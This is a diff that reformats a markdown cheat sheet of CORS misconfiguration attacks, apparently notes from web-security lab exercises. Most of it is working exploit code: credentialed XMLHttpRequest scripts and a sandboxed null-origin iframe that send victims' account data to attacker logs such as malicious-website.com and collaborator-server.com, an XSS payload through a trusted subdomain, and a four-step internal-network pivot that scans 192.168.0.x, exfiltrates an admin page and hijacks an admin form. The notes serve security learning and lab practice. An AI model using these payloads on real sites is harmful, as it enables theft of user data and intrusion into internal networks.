@@ -1,41 +1,197 @@
 # Cross Origin Resource Sharing (CORS)
 
-Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). - Same-origin policy --restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain. - A controlled relaxation of the same-origin policy is possible using cross-origin resource sharing (CORS). - Various headers used in the response (origin, credentials, headers, methods) - From a security perspective, the use of the wildcard is restricted in the specification as you cannot combine the wildcard with the cross-origin transfer of credentials (authentication, cookies or client-side certificates). - Pre-Flight Checks - cross-origin request is preceded by a request using the OPTIONS method, and the CORS protocol necessitates an initial check on what methods and headers are permitted prior to allowing the cross-origin request.
+{% hint style="info" %}
+A browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP).
+{% endhint %}
 
-*   CORS vulnerability with basic origin reflection (Server-generated ACAO header from client-specified Origin header)
+## Overview
 
-    * script to be used :
-    * \
-      &#x20; 			var req = new XMLHttpRequest();\
-      &#x20; 			req.onload = reqListener;\
-      &#x20; 			req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);\
-      &#x20; 			req.withCredentials = true;\
-      &#x20; 			req.send();\
-      &#x20; 		function reqListener() {      \
-      &#x20; 			location='/log?key='+this.responseText;
+* **Same-origin policy (SOP)** - a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain.
+* A controlled relaxation of the same-origin policy is possible using CORS.
+* Various headers used in the response: `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, `Access-Control-Allow-Headers`, `Access-Control-Allow-Methods`.
+* From a security perspective, the use of the wildcard (`*`) is restricted in the specification, as you cannot combine the wildcard with the cross-origin transfer of credentials (authentication, cookies, or client-side certificates).
+* **Pre-Flight Checks** - a cross-origin request is preceded by a request using the `OPTIONS` method, and the CORS protocol necessitates an initial check on what methods and headers are permitted prior to allowing the cross-origin request.
 
-    }; - Test whether the Origin header reflects arbitrary value sent by user and is reflected in the response header Allow-Origin along with Allow-Credentials.
-* CORS vulnerability with trusted null origin
-  * Errors parsing Origin headers
-    * Application might whitelist a set of domains and sub-domain(include inexistent as well) to compare (prefix/suffix comparison) with the Client specified Origin Header.(normalwebsite.com)
-    * Can be bypassed by using (hackernormalwebsite.com, normalwebsite.evil.com)
-  *   Whitelisted null origin value
+## CORS Vulnerability with Basic Origin Reflection
 
-      * Origin header supports the value null. Browsers might send null in Origin header in various situations: Cross-origin redirects. Requests from serialized data. Request using the file: protocol. Sandboxed cross-origin requests.
-      * Application might whitelist 'null' to support local development
-      * Bypassed using a iframe sandboxed cross-origin request
-      *
+* Server-generated `Access-Control-Allow-Origin` header directly reflects the client-specified `Origin` header.
+* Test whether the `Origin` header value is reflected arbitrarily in the response's `Access-Control-Allow-Origin` header, along with `Access-Control-Allow-Credentials: true`.
+* **Payload:**
 
-      var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true; req.send();
+```html
+<html>
+  <body>
+    <script>
+        var req = new XMLHttpRequest();
+        req.onload = reqListener;
+        req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+        req.withCredentials = true;
+        req.send();
 
-      function reqListener() { location='https://malicious-website.com/log?key='+encodeURIComponent(this.responseText); }; ">
-* CORS vulnerability with trusted insecure protocols
-  * Exploiting XSS via CORS trust relationships
-    * If a application trusts any of its sub-domain that is vulnerable to XSS we can exploit CORS to get sensitive data from the application since the sub-domain is trusted(whitelisted).
-  * Breaking TLS with poorly configured CORS
-    * An application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP.
-    * Steps The victim user makes any plain HTTP request. The attacker injects a redirection to: http://trusted-subdomain.vulnerable-website.com The victim's browser follows the redirect. The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to: https://vulnerable-website.com The victim's browser makes the CORS request, including the origin: http://trusted-subdomain.vulnerable-website.com The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response. The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.
-  * If an application trusts a vulnerable subdomain (XSS) we can exploit the CORS vuln in the actual application leveraging XSS vulnerability present in the trusted subdomain or url. (Test for HTTP and HTTPS protocols)
-  * \
-    &#x20; 	document.location="http://trusted-vulnerable-website.com/?productId=4\<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://cors-misconfigured-website.com/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://collaborator -server.com/log?key='%2bthis.responseText; };%3c/script>\&storeId=1"
-* CORS vulnerability with internal network pivot attack
+        function reqListener() {
+            location='/log?key='+this.responseText;
+        };
+    </script>
+  </body>
+</html>
+```
+
+## CORS Vulnerability with Trusted Null Origin
+
+### Errors Parsing Origin Headers
+
+* Application might whitelist a set of domains and sub-domains (including non-existent ones) to compare (prefix/suffix comparison) against the client-specified `Origin` header (e.g. `normalwebsite.com`).
+* Can be bypassed by using domains such as `hackernormalwebsite.com` or `normalwebsite.evil.com`.
+
+### Whitelisted Null Origin Value
+
+* The `Origin` header supports the value `null`. Browsers might send `null` in the `Origin` header in various situations:
+  * Cross-origin redirects.
+  * Requests from serialized data.
+  * Requests using the `file:` protocol.
+  * Sandboxed cross-origin requests.
+* Application might whitelist `null` to support local development.
+* Bypassed using a sandboxed cross-origin `iframe` request.
+* **Payload:**
+
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='https://malicious-website.com/log?key='+encodeURIComponent(this.responseText);
+};
+</script>"></iframe>
+```
+
+## CORS Vulnerability with Trusted Insecure Protocols
+
+### Exploiting XSS via CORS Trust Relationships
+
+* If an application trusts any of its sub-domains that is vulnerable to XSS, we can exploit CORS to get sensitive data from the application, since the sub-domain is trusted (whitelisted).
+
+### Breaking TLS with Poorly Configured CORS
+
+* An application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP.
+* **Attack steps:**
+  1. The victim user makes any plain HTTP request.
+  2. The attacker injects a redirection to: `http://trusted-subdomain.vulnerable-website.com`.
+  3. The victim's browser follows the redirect.
+  4. The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to: `https://vulnerable-website.com`.
+  5. The victim's browser makes the CORS request, including the origin: `http://trusted-subdomain.vulnerable-website.com`.
+  6. The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
+  7. The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.
+* If an application trusts a vulnerable subdomain (XSS), we can exploit the CORS vulnerability in the actual application by leveraging the XSS vulnerability present in the trusted subdomain or URL. (Test for both HTTP and HTTPS protocols.)
+* **Payload:**
+
+```html
+<script>
+document.location="http://trusted-vulnerable-website.com/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://cors-misconfigured-website.com/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://collaborator-server.com/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```
+
+## CORS Vulnerability with Internal Network Pivot Attack
+
+{% hint style="info" %}
+Used to pivot from a public-facing CORS-vulnerable application into scanning/exploiting an internal network the victim's browser can reach, but the attacker cannot.
+{% endhint %}
+
+### Step 1 - Internal IP Scanning
+
+```javascript
+<script>
+var q = [], collaboratorURL = 'http://$collaboratorPayload';
+
+for(i=1;i<=255;i++) {
+    q.push(function(url) {
+        return function(wait) {
+            fetchUrl(url, wait);
+        }
+    }('http://192.168.0.'+i+':8080'));
+}
+
+for(i=1;i<=20;i++){
+    if(q.length)q.shift()(i*100);
+}
+
+function fetchUrl(url, wait) {
+    var controller = new AbortController(), signal = controller.signal;
+    fetch(url, {signal}).then(r => r.text().then(text => {
+        location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now();
+    }))
+    .catch(e => {
+        if(q.length) {
+            q.shift()(wait);
+        }
+    });
+    setTimeout(x => {
+        controller.abort();
+        if(q.length) {
+            q.shift()(wait);
+        }
+    }, wait);
+}
+</script>
+```
+
+### Step 2 - Detect XSS on Discovered Internal Host
+
+```javascript
+<script>
+function xss(url, text, vector) {
+    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+
+function fetchUrl(url, collaboratorURL){
+    fetch(url).then(r => r.text().then(text => {
+        xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
+    }))
+}
+
+fetchUrl("http://$ip", "http://$collaboratorPayload");
+</script>
+```
+
+### Step 3 - Exfiltrate Internal Admin Page via XSS
+
+```javascript
+<script>
+function xss(url, text, vector) {
+    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+
+function fetchUrl(url, collaboratorURL){
+    fetch(url).then(r=>r.text().then(text=>
+    {
+        xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
+    }
+    ))
+}
+
+fetchUrl("http://$ip", "http://$collaboratorPayload");
+</script>
+```
+
+### Step 4 - Auto-Create Admin User via XSS
+
+```javascript
+<script>
+function xss(url, text, vector) {
+    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+
+function fetchUrl(url){
+    fetch(url).then(r=>r.text().then(text=>
+    {
+    xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
+    }
+    ))
+}
+
+fetchUrl("http://$ip");
+</script>
+```
